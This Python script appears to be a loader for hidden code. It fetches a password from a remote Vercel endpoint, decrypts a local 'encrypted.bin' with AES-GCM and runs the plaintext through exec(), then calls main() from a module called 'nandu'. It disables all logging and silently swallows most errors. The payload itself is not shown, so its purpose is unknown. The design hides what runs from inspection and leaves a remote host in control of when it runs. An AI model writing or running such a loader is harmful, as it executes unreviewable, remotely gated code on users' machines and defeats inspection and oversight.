import requests
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import logging
import os
import sys

logging.disable(logging.CRITICAL)

VERCEL_URL = "https://key-2qfm.vercel.app/api/key"

def fetch_key():
    try:
        resp = requests.get(VERCEL_URL, timeout=10)
        if resp.status_code == 200:
            return resp.text.strip()
    except:
        return None
    return None

def decrypt_and_run():
    try:
        bin_path = os.path.join(os.path.dirname(__file__), 'encrypted.bin')
        if not os.path.exists(bin_path):
            bin_path = 'encrypted.bin'
            if not os.path.exists(bin_path):
                return
        
        with open(bin_path, 'rb') as f:
            data = f.read()
        
        nonce = data[:12]
        ciphertext = data[12:]
        
        password = fetch_key()
        if not password:
            return
        key = hashlib.sha256(password.encode()).digest()
        aesgcm = AESGCM(key)
        plaintext = aesgcm.decrypt(nonce, ciphertext, b"")
        
        # 🔥 Force-run nandu.py ka main logic
        # Pehle normal exec try karo, agar fail ho toh direct main() call karo
        try:
            exec(plaintext.decode('utf-8'), {'__name__': '__main__'})
        except:
            # Agar __main__ check fail ho, toh code ko alag se run karo
            exec(plaintext.decode('utf-8'))
            
            # Agar nandu mein main() function hai toh call karo
            try:
                from nandu import main
                main()
            except:
                pass
    except Exception as e:
        # Silent fail – but debug ke liye print
        print(f"🔥 Decrypt error: {e}")